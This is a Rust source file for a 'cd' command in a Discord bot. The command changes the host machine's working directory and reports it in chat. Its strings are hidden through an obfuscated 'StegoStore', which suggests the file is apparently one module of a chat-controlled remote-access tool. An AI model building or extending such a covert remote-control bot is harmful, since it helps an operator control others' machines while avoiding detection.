use crate::commands::*;
use crate::core::stego_store::{StegoStore, StringCategory};
use std::boxed::Box;
use anyhow::Result;
use async_trait::async_trait;
use std::env;
use std::path::Path;
use crate::core::http_client::HttpClient;
use twilight_model::channel::message::Message;

pub struct CdCommand;

impl CdCommand {
    fn f(key: &str) -> String { StegoStore::get(StringCategory::Filesystem, key) }
    fn c(key: &str) -> String { StegoStore::get(StringCategory::CmdMeta, key) }
}

#[async_trait]
impl BotCommand for CdCommand {
    fn name(&self) -> &str {
        Box::leak(Self::c("CD_NAME").into_boxed_str())
    }
    
    fn description(&self) -> &str {
        Box::leak(StegoStore::get(StringCategory::Desc, "CD").into_boxed_str())
    }
    
    fn category(&self) -> &str {
        Box::leak(Self::c("CAT_FS").into_boxed_str())
    }
    
    fn usage(&self) -> &str {
        Box::leak(Self::c("CD_USAGE").into_boxed_str())
    }
    
    fn examples(&self) -> &'static [&'static str] {
        Box::leak(vec![".cd /home", ".cd ..", ".cd \\\\SnakyServer\\D"].into_boxed_slice())
    }
    
    fn aliases(&self) -> &'static [&'static str] {
        Box::leak(vec![
            Box::leak(Self::c("CD_ALIAS1").into_boxed_str()) as &'static str,
        ].into_boxed_slice())
    }

    async fn execute(&self, http: &Arc<HttpClient>, msg: &Message, args: Arguments) -> Result<()> {
        let dir_path_owned = args.rest();
        let dir_path = dir_path_owned.trim();

        if dir_path.is_empty() {
            // Show current directory
            let current_dir =
                env::current_dir().unwrap_or_else(|_| Path::new("unknown").to_path_buf());
            http.create_message(msg.channel_id.get(), &format!(
                    "{} `{}`",
                    Self::f("CD_CURRENT"),
                    current_dir.display()
                )).await?;
            return Ok(());
        }

        let path = Path::new(dir_path);
        
        match env::set_current_dir(path) {
            Ok(_) => {
                let new_dir =
                    env::current_dir().unwrap_or_else(|_| Path::new("unknown").to_path_buf());
                http.create_message(msg.channel_id.get(), &format!(
                        "{} `{}`",
                        Self::f("CD_SUCCESS"),
                        new_dir.display()
                    )).await?;
            }
            Err(e) => {
                http.create_message(msg.channel_id.get(), &format!(
                        "{} `{}`: {}",
                        Self::f("CD_ERR"),
                        dir_path, e
                    )).await?;
            }
        }

        Ok(())
    }
}

